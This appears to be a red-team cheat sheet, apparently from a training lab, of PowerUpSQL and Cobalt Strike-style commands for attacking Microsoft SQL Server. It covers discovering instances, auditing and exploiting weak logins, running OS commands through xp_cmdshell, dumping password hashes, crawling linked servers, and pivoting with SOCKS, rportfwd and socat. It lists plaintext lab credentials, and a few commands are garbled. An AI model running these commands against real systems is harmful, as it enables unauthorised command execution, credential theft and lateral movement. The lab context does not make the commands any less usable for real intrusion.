```
Get-sqlinstancebroadcast -verbose
 Get-sqlinstancebroadcast -verbose | Get-sqlserverlogindefaultpw -verbose
Get-SQLInstanceDomain -Verbose
Get-SQLServerInfo -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS
Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" | Get-SQLServerInfo
Get-SQLInstanceLocal -Instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456' | Get-SQLServerInfo
```
### Follow out OS Commands
```
$Servers = Get-SQLInstanceDomain –Verbose | Get-SQLConnectionTestThreaded –Verbose -Threads 10
Invoke-SQLAuditWeakLoginPw –Verbose
Invoke-SQLAuditWeakLoginPw –Verbose –Instance DESKTOP-4D21EQP\SQLEXPRESS –Exploit
invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "dir c:\windows\system32\Drivers\etc" -RawResults
invoke-SQLOSCmd -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Command "ipconfig" -RawResults
Invoke-SQLOSCmd –Verbose –Command “whoami” –Threads 10 -Instance DESKTOP-4D21EQP\SQLEXPRESS
Get-SQLServerPasswordHash -Verbose -Instance DESKTOP-4D21EQP\SQLEXPRESS -Migrate
```

### Linked Server Crawling
```
Get-SQLServerLinkCrawl -verbose -instance "DESKTOP-4D21EQP\SQLEXPRESS" -username 'sa' -password '123456'
Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
Get-SQLServerLinkCrawl -instance "DESKTOP-4D21EQP\SQLEXPRESS" -Query "exec master..xp_cmdshell ‘whoami’" -username 'sa' -password '123456'
```
```
make_token dev.zeropointsecurity.co.uk\bridgesb Scorpion!
make_token cyberbotic.io\svc_mssql Cyberb0tic
powershell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version'
powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults 
powershell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\Users\svc_mssql\Desktop' -RawResults 

powerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
powershell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
powershelll Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | f
111
```

```
socks 1080
rportfwd 8080 10.8.0.6 80
proxychains socat TCP4-Listen:1433,fork TCP:192.168.1.199:1433
```

